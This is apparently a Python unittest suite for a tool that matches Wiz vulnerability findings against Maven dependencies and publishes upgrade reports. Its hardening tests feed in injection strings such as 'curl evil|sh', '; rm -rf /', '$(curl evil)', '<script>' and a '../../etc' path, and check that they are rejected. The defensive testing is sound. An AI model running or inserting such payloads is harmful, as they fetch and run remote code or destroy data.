import json
import tempfile
import textwrap
import unittest
from pathlib import Path

from wizconnector import findings as fnd
from wizconnector import mvnversion as mv
from wizconnector import publish, render
from wizconnector.maventree import build_inventory, load_trees
from wizconnector.pomlocate import PomIndex, locate

FIX = Path(__file__).parent / "fixtures"
SAMPLE = FIX / "sample-project"


def sample_inventory():
    inv = build_inventory(load_trees([SAMPLE / "dependency-tree.json"]))
    idx = PomIndex(SAMPLE)
    for d in inv.direct.values():
        d.declarations = [dict(locate(idx, m, d.ga), module=m) for m in sorted(d.modules)]
    return inv


class VersionTests(unittest.TestCase):
    def test_ordering(self):
        ordered = ["1.0-alpha1", "1.0-beta", "1.0-rc1", "1.0-SNAPSHOT", "1.0", "1.0-sp1", "1.0.1", "1.1", "2.9.10", "2.9.10.8", "2.10.0"]
        for a, b in zip(ordered, ordered[1:]):
            self.assertEqual(mv.compare(a, b), -1, f"{a} < {b}")
            self.assertEqual(mv.compare(b, a), 1, f"{b} > {a}")

    def test_equivalences(self):
        for a, b in [("1", "1.0.0"), ("1.0", "1.0.RELEASE"), ("5.3.18.RELEASE", "5.3.18"), ("1.0-ga", "1.0-final")]:
            self.assertEqual(mv.compare(a, b), 0, f"{a} == {b}")

    def test_fixes_per_line(self):
        fx = ["2.12.7.1", "2.13.4.2"]
        self.assertTrue(mv.fixes("2.12.7.1", fx))
        self.assertTrue(mv.fixes("2.12.9", fx))
        self.assertFalse(mv.fixes("2.13.0", fx))     # 2.13 line needs 2.13.4.2
        self.assertTrue(mv.fixes("2.14.0", fx))      # above highest fix
        self.assertFalse(mv.fixes("2.9.8", fx))

    def test_minimal_safe_version(self):
        self.assertEqual(mv.minimal_safe_version("2.9.8", [["2.12.6.1", "2.13.2.1"], ["2.12.7.1", "2.13.4.2"]]), "2.12.7.1")
        self.assertEqual(mv.minimal_safe_version("2.14.1", [["2.15.0", "2.12.2"], ["2.17.1", "2.12.4"]]), "2.17.1")
        self.assertEqual(mv.minimal_safe_version("1.0", [["2.0.0-rc1"]]), "2.0.0-rc1")   # pre-release only as last resort
        self.assertEqual(mv.minimal_safe_version("1.0", [["2.0.0-rc1", "2.0.0"]]), "2.0.0")


class TreeTests(unittest.TestCase):
    def test_direct_vs_transitive(self):
        inv = build_inventory(load_trees([SAMPLE / "dependency-tree.json"]))
        self.assertEqual(sorted(inv.reactor), ["com.example:core", "com.example:sample-parent", "com.example:web"])
        self.assertEqual(sorted(inv.direct), [
            "com.fasterxml.jackson.core:jackson-databind", "junit:junit", "org.apache.commons:commons-text",
            "org.apache.logging.log4j:log4j-core", "org.springframework:spring-webmvc"])
        # jackson reaches `web` only through the reactor module `core`: still direct, never transitive
        self.assertNotIn("com.fasterxml.jackson.core:jackson-databind", inv.transitive)
        self.assertEqual(inv.direct["com.fasterxml.jackson.core:jackson-databind"].modules, {"com.example:core"})
        self.assertIn("org.springframework:spring-core", inv.transitive)
        self.assertEqual(inv.transitive["org.springframework:spring-core"].via, {"org.springframework:spring-webmvc"})

    def test_concatenated_and_duplicate_objects(self):
        text = (SAMPLE / "dependency-tree.json").read_text()
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "t.json"
            p.write_text(text + "\n" + text)  # appended twice
            self.assertEqual(len(load_trees([p])), 3)


class PomLocateTests(unittest.TestCase):
    def test_sample_declarations(self):
        idx = PomIndex(SAMPLE)
        self.assertEqual(locate(idx, "com.example:core", "org.apache.logging.log4j:log4j-core"),
                         {"kind": "literal", "file": "core/pom.xml", "section": "dependencies", "value": "2.14.1"})
        jd = locate(idx, "com.example:core", "com.fasterxml.jackson.core:jackson-databind")
        self.assertEqual((jd["kind"], jd["file"], jd["property"]), ("property", "pom.xml", "jackson.version"))
        ct = locate(idx, "com.example:web", "org.apache.commons:commons-text")
        self.assertEqual((ct["kind"], ct["file"], ct["section"]), ("literal", "pom.xml", "dependencyManagement"))

    def test_external_parent_and_bom(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            (root / "pom.xml").write_text(textwrap.dedent("""\
                <project xmlns="http://maven.apache.org/POM/4.0.0">
                  <parent><groupId>org.springframework.boot</groupId><artifactId>spring-boot-starter-parent</artifactId><version>3.2.0</version><relativePath/></parent>
                  <groupId>acme</groupId><artifactId>app</artifactId><version>1</version>
                  <dependencyManagement><dependencies>
                    <dependency><groupId>software.amazon.awssdk</groupId><artifactId>bom</artifactId><version>2.20.0</version><type>pom</type><scope>import</scope></dependency>
                  </dependencies></dependencyManagement>
                  <dependencies>
                    <dependency><groupId>org.yaml</groupId><artifactId>snakeyaml</artifactId></dependency>
                    <dependency><groupId>com.h2database</groupId><artifactId>h2</artifactId><version>${h2.version}</version></dependency>
                    <dependency><groupId>${project.groupId}</groupId><artifactId>lib</artifactId><version>${project.version}</version></dependency>
                  </dependencies>
                </project>"""))
            idx = PomIndex(root)
            sy = locate(idx, "acme:app", "org.yaml:snakeyaml")
            self.assertEqual(sy["kind"], "managed-external")
            self.assertEqual(sy["external_parent"], "org.springframework.boot:spring-boot-starter-parent")
            self.assertTrue(sy["boms"][0].startswith("software.amazon.awssdk:bom:2.20.0"))
            h2 = locate(idx, "acme:app", "com.h2database:h2")
            self.assertEqual((h2["kind"], h2["property"]), ("external-property", "h2.version"))
            self.assertEqual(locate(idx, "acme:app", "acme:lib")["kind"], "project-version")

    def test_inherited_dependency_from_parent(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            (root / "child").mkdir()
            (root / "pom.xml").write_text(
                "<project><groupId>g</groupId><artifactId>parent</artifactId><version>1</version>"
                "<properties><guava.version>31.0-jre</guava.version></properties>"
                "<dependencies><dependency><groupId>com.google.guava</groupId><artifactId>guava</artifactId>"
                "<version>${guava.version}</version></dependency></dependencies></project>")
            (root / "child" / "pom.xml").write_text(
                "<project><parent><groupId>g</groupId><artifactId>parent</artifactId><version>1</version></parent>"
                "<artifactId>child</artifactId></project>")
            d = locate(PomIndex(root), "g:child", "com.google.guava:guava")
            self.assertEqual((d["kind"], d["file"], d["property"]), ("property", "pom.xml", "guava.version"))


class FindingsTests(unittest.TestCase):
    def setUp(self):
        self.inv = sample_inventory()
        self.raw = json.loads((FIX / "wiz-findings.json").read_text())["findings"]

    def test_parse_package_variants(self):
        self.assertEqual(fnd.parse_package("g:a"), ("g", "a"))
        self.assertEqual(fnd.parse_package("g:a:1.0"), ("g", "a"))
        self.assertEqual(fnd.parse_package("pkg:maven/g.x/a-b@1.2?type=jar"), ("g.x", "a-b"))
        self.assertEqual(fnd.parse_package("a"), (None, "a"))
        self.assertEqual(fnd.split_versions("2.15.0, 2.12.2 | >=2.3.1"), ["2.15.0", "2.12.2", "2.3.1"])

    def test_evaluate(self):
        res = fnd.evaluate(self.raw, self.inv)
        ups = {u.ga: u for u in res.upgrades}
        self.assertEqual(list(ups)[0], "org.apache.logging.log4j:log4j-core")  # KEV sorts first
        self.assertEqual(ups["org.apache.logging.log4j:log4j-core"].target, "2.17.1")
        self.assertEqual(len(ups["org.apache.logging.log4j:log4j-core"].cves), 4)  # artifact-only + purl matched
        self.assertEqual(ups["com.fasterxml.jackson.core:jackson-databind"].target, "2.12.7.1")
        self.assertEqual(ups["org.apache.commons:commons-text"].target, "1.10.0")
        self.assertNotIn("org.springframework:spring-beans", ups)
        self.assertEqual(set(res.skipped_transitive), {"org.springframework:spring-beans", "org.springframework:spring-web"})
        self.assertEqual([u.ga for u in res.no_fix], ["org.springframework:spring-webmvc"])
        self.assertEqual(list(res.unmatched), ["lodash"])

    def test_stale_finding_dropped(self):
        raw = [{"cve": "CVE-2020-0001", "package": "junit:junit", "fixed_versions": "4.11", "severity": "HIGH"}]
        res = fnd.evaluate(raw, self.inv)
        self.assertEqual(res.upgrades, [])
        self.assertEqual(res.already_fixed, {"junit:junit": ["CVE-2020-0001"]})

    def test_duplicate_cve_merged(self):
        raw = [{"cve": "CVE-2020-0009", "package": "junit:junit", "fixed_versions": "4.13.1", "severity": "LOW"},
               {"cve": "CVE-2020-0009", "package": "junit", "fixed_versions": "4.13.2", "severity": "HIGH", "cisa_kev": True}]
        u = fnd.evaluate(raw, self.inv).upgrades[0]
        self.assertEqual((len(u.cves), u.max_severity, u.kev, u.target), (1, "HIGH", True, "4.13.1"))


class RenderPublishTests(unittest.TestCase):
    def setUp(self):
        raw = json.loads((FIX / "wiz-findings.json").read_text())["findings"]
        self.res = fnd.evaluate(raw, sample_inventory())

    def test_body_is_compact_and_parseable(self):
        b = render.body(self.res, "acme/x", "main", "2026-11-04T00:00Z", None)
        self.assertIn(render.MARKER, b)
        self.assertLess(len(b), 8000)
        data = json.loads(b.split("```json\n", 1)[1].split("\n```", 1)[0])
        self.assertEqual(data["schema"], render.SCHEMA)
        self.assertEqual([u["ga"] for u in data["upgrades"]][0], "org.apache.logging.log4j:log4j-core")
        self.assertEqual(publish.previous_upgrades(b)["org.apache.commons:commons-text"], "1.10.0")

    def test_body_respects_size_limit(self):
        many = [{"cve": f"CVE-2020-{i:05d}", "package": "junit:junit", "fixed_versions": "4.13.1", "severity": "LOW"}
                for i in range(8000)]
        res = fnd.evaluate(many, sample_inventory())
        b = render.body(res, "acme/x", None, "t", None)
        self.assertLessEqual(len(b), render.MAX_BODY)
        json.loads(b.split("```json\n", 1)[1].split("\n```", 1)[0])

    def test_fingerprint_stable_and_sensitive(self):
        fp = render.fingerprint(self.res)
        self.assertEqual(fp, render.fingerprint(self.res))
        self.res.upgrades[0].target = "9.9.9"
        self.assertNotEqual(fp, render.fingerprint(self.res))

    def test_publish_plan(self):
        b = render.body(self.res, "acme/x", None, "t", None)
        fp = render.fingerprint(self.res)
        ups = {u.ga: u.target for u in self.res.upgrades}
        self.assertEqual(publish.plan([], fp, ups, True).action, "create")
        self.assertEqual(publish.plan([], fp, {}, True).action, "none")
        bot = {"login": "app/github-actions"}
        existing = [{"number": 7, "body": b, "author": bot}, {"number": 9, "body": b, "author": bot},
                    {"number": 3, "body": "unrelated", "author": bot}]
        p = publish.plan(existing, fp, ups, True)
        self.assertEqual((p.action, p.number, p.duplicates), ("noop", 7, (9,)))
        p = publish.plan(existing, "different", {**ups, "new:dep": "1.0"}, True)
        self.assertEqual(p.action, "update")
        self.assertIn("`new:dep`", p.comment)
        self.assertEqual(publish.plan(existing, fp, {}, True).action, "close")
        self.assertEqual(publish.plan(existing, fp, {}, False).action, "noop")


class HardeningTests(unittest.TestCase):
    def test_validation_rejects_injection(self):
        inv = sample_inventory()
        raw = [
            {"cve": "CVE-2021-44228\n- run `curl evil|sh`", "package": "org.apache.logging.log4j:log4j-core", "severity": "HIGH"},
            {"cve": "CVE-2021-44228", "package": "log4j-core`; rm -rf /", "severity": "HIGH"},
            {"cve": "CVE-2021-44228", "package": "org.apache.logging.log4j:log4j-core",
             "fixed_versions": ["2.17.1", "2.17.1 && curl x", "<script>"], "severity": "critical",
             "url": "https://evil.example/x", "cisa_kev": "true"},
        ]
        res = fnd.evaluate(raw, inv)
        self.assertEqual(res.rejected, 2)
        u = res.upgrades[0]
        self.assertEqual((u.target, u.max_severity, u.kev, u.cves[0].url), ("2.17.1", "CRITICAL", True, None))
        body = render.body(res, "acme/x", None, "t", None)
        self.assertNotIn("curl", body)
        self.assertNotIn("evil", body)

    def test_hostile_pom_values_never_reach_commands(self):
        from wizconnector.findings import Upgrade
        evil = Upgrade(ga="com.x:a$(curl evil)", current="1.0", target="2.0",
                       declarations=[{"kind": "property", "file": "pom.xml", "property": "x;rm -rf /"}])
        prop = Upgrade(ga="com.x:b", current="1.0", target="2.0",
                       declarations=[{"kind": "property", "file": "../../etc/pom.xml", "property": "b.version"}])
        out = "\n".join(render.fix_commands([evil, prop]))
        self.assertNotIn("curl", out)
        self.assertNotIn("rm -rf", out)
        self.assertNotIn("mvn", out)
        self.assertEqual(out.count("edit by hand"), 2)

    def test_publish_ignores_foreign_or_misplaced_markers_and_restores_tampering(self):
        raw = json.loads((FIX / "wiz-findings.json").read_text())["findings"]
        res = fnd.evaluate(raw, sample_inventory())
        b = render.body(res, "acme/x", None, "2026-11-04T00:00Z", None)
        fp, ups = render.fingerprint(res), {u.ga: u.target for u in res.upgrades}
        bot = {"login": "app/github-actions"}
        attacker = [{"number": 1, "body": b, "author": {"login": "mallory"}},
                    {"number": 2, "body": "hello\n" + b, "author": bot}]
        self.assertEqual(publish.plan(attacker, fp, ups, True, new_body=b).action, "create")
        # same findings, new timestamp only -> noop; same findings but edited body -> restore
        later = render.body(res, "acme/x", None, "2026-11-05T00:00Z", "https://x/run/2")
        mine = [{"number": 5, "body": b, "author": bot}]
        self.assertEqual(publish.plan(mine, fp, ups, True, new_body=later).action, "noop")
        tampered = [{"number": 5, "body": b.replace("use-dep-version", "use-dep-version; curl evil"), "author": bot}]
        p = publish.plan(tampered, fp, ups, True, new_body=later)
        self.assertEqual((p.action, p.number, p.comment), ("update", 5, None))

    def test_ghsa_and_wiz_url_accepted(self):
        f = fnd.normalise({"cve": "GHSA-jfh8-c2jp-5v3q", "package": "a:b", "url": "https://app.wiz.io/explorer/x?y=1"})
        self.assertIsNotNone(f)
        self.assertEqual(f.url, "https://app.wiz.io/explorer/x?y=1")

    def test_inventory_json_roundtrip(self):
        from wizconnector.maventree import Inventory
        inv = sample_inventory()
        again = Inventory.from_json(json.loads(json.dumps(inv.to_json())))
        raw = json.loads((FIX / "wiz-findings.json").read_text())["findings"]
        a, b = fnd.evaluate(raw, inv), fnd.evaluate(raw, again)
        self.assertEqual(render.fingerprint(a), render.fingerprint(b))
        self.assertEqual(render.body(a, "r", None, "t", None), render.body(b, "r", None, "t", None))

    def test_fix_commands_bump_shared_property_once(self):
        from wizconnector.findings import Upgrade
        decl = {"kind": "property", "file": "pom.xml", "property": "jackson.version"}
        ups = [Upgrade(ga="com.fasterxml.jackson.core:jackson-databind", current="2.9.8", target="2.12.7.1", declarations=[decl]),
               Upgrade(ga="com.fasterxml.jackson.core:jackson-core", current="2.9.8", target="2.13.0", declarations=[decl])]
        cmds = [c for c in render.fix_commands(ups) if not c.startswith("#")]
        self.assertEqual(len(cmds), 1)
        self.assertIn("-Dproperty=jackson.version -DnewVersion=2.13.0", cmds[0])

    def test_replace_mode(self):
        raw = json.loads((FIX / "wiz-findings.json").read_text())["findings"]
        res = fnd.evaluate(raw, sample_inventory())
        b = render.body(res, "acme/x", None, "t", None)
        ups = {u.ga: u.target for u in res.upgrades}
        p = publish.plan([{"number": 4, "body": b, "author": {"login": "app/github-actions"}}], "changed", ups, True,
                         on_change="replace")
        self.assertEqual((p.action, p.number), ("replace", 4))

    def test_agent_output_fallback_and_error(self):
        from wizconnector import cli
        with tempfile.TemporaryDirectory() as td:
            ao = Path(td) / "agent_output.json"
            ao.write_text(json.dumps({"items": [{"type": "publish_wiz_report",
                                                 "findings_json": json.dumps({"findings": [{"cve": "CVE-2020-15250", "package": "junit:junit", "fixed_versions": ["4.13.1"], "severity": "MEDIUM"}]})}]}))
            self.assertEqual(len(cli._load_findings(str(Path(td) / "missing.json"), str(ao))[0]), 1)
            err = Path(td) / "f.json"
            err.write_text(json.dumps({"error": "401 Invalid client credentials", "findings": []}))
            with self.assertRaises(SystemExit):
                cli._load_findings(str(err), None)


class ReviewRegressionTests(unittest.TestCase):
    def _inv(self, module_versions, prop_decl=None):
        from wizconnector.maventree import DirectDep, Inventory
        d = DirectDep(ga="com.fasterxml.jackson.core:jackson-databind", version=list(module_versions.values())[0],
                      modules=set(module_versions), module_versions=dict(module_versions),
                      declarations=[prop_decl] if prop_decl else [{"kind": "literal", "file": "pom.xml"}])
        return Inventory(reactor={m: "1" for m in module_versions}, direct={d.ga: d}, transitive={})

    def test_vulnerable_second_module_not_masked_and_no_downgrade(self):
        inv = self._inv({"g:a": "2.15.0", "g:b": "2.9.8"})
        raw = [{"cve": "CVE-2022-42003", "package": "com.fasterxml.jackson.core:jackson-databind",
                "fixed_versions": ["2.12.7.1", "2.13.4.2"], "severity": "HIGH"}]
        u = fnd.evaluate(raw, inv).upgrades[0]
        self.assertEqual((u.current, u.target), ("2.9.8", "2.15.0"))   # never below what module a has

    def test_wiz_uuid_id_and_comma_list(self):
        f = fnd.normalise({"id": "5f0c2b4e-1111-2222-3333-444455556666", "name": "CVE-2021-44228",
                           "detailedName": "org.apache.logging.log4j:log4j-core", "fixedVersion": ["2.15.0, 2.12.2"]})
        self.assertEqual((f.cve, f.fixed_versions), ("CVE-2021-44228", ["2.15.0", "2.12.2"]))
        self.assertIsNone(fnd.normalise({"cve": "CVE-2021-44228", "package": "a:b", "fixed_versions": ["<script>"]}))

    def test_cli_fails_closed(self):
        from wizconnector import cli
        with tempfile.TemporaryDirectory() as td:
            inv = Path(td) / "inv.json"
            inv.write_text(json.dumps(sample_inventory().to_json()))
            cases = {
                "missing-key": {"wiz_scope": {"resource_name": "acme/x"}},
                "all-rejected": {"findings": [{"cve": "nope", "package": "a:b"}], "wiz_scope": {"resource_name": "x"}},
                "empty-no-scope": {"findings": []},
            }
            for name, doc in cases.items():
                f = Path(td) / f"{name}.json"
                f.write_text(json.dumps(doc))
                with self.assertRaises(SystemExit, msg=name):
                    cli.main(["report", "--deps", str(inv), "--findings", str(f), "--out-dir", str(Path(td) / name)])
            ok = Path(td) / "ok.json"
            ok.write_text(json.dumps({"findings": [], "wiz_scope": {"resource_name": "acme/x"}}))
            cli.main(["report", "--deps", str(inv), "--findings", str(ok), "--out-dir", str(Path(td) / "ok")])
            self.assertEqual(json.loads((Path(td) / "ok" / "report.json").read_text())["upgrades"], [])

    def test_child_property_override_points_to_child(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            (root / "web").mkdir()
            (root / "pom.xml").write_text(
                "<project><groupId>g</groupId><artifactId>parent</artifactId><version>1</version>"
                "<properties><jackson.version>2.9.8</jackson.version></properties>"
                "<dependencyManagement><dependencies><dependency><groupId>j</groupId><artifactId>d</artifactId>"
                "<version>${jackson.version}</version></dependency></dependencies></dependencyManagement></project>")
            (root / "web" / "pom.xml").write_text(
                "<project><parent><groupId>g</groupId><artifactId>parent</artifactId><version>1</version></parent>"
                "<artifactId>web</artifactId><properties><jackson.version>2.15.0</jackson.version></properties>"
                "<dependencies><dependency><groupId>j</groupId><artifactId>d</artifactId></dependency></dependencies></project>")
            d = locate(PomIndex(root), "g:web", "j:d")
            self.assertEqual((d["kind"], d["file"], d["value"]), ("property", "web/pom.xml", "2.15.0"))

    def test_flavor_kept_and_shared_property_flagged(self):
        self.assertEqual(mv.minimal_safe_version("31.1-jre", [["32.0.0-android", "32.0.0-jre"]]), "32.0.0-jre")
        from wizconnector.findings import Upgrade
        decl = {"kind": "property", "file": "pom.xml", "property": "jackson.version"}
        u = Upgrade(ga="com.fasterxml.jackson.core:jackson-databind", current="2.9.8", target="2.12.7.1",
                    declarations=[decl], shared_with=["com.fasterxml.jackson.core:jackson-core"])
        out = "\n".join(render.fix_commands([u]))
        self.assertIn("SHARED with jackson-core", out)

    def test_appended_tree_keeps_latest_module(self):
        old = {"groupId": "g", "artifactId": "m", "version": "1", "children": [
            {"groupId": "x", "artifactId": "y", "version": "1.0", "scope": "compile"}]}
        new = {"groupId": "g", "artifactId": "m", "version": "1", "children": [
            {"groupId": "x", "artifactId": "y", "version": "2.0", "scope": "compile"}]}
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "t.json"
            p.write_text(json.dumps(old) + "\n" + json.dumps(new))
            inv = build_inventory(load_trees([p]))
            self.assertEqual(inv.direct["x:y"].version, "2.0")


if __name__ == "__main__":
    unittest.main()
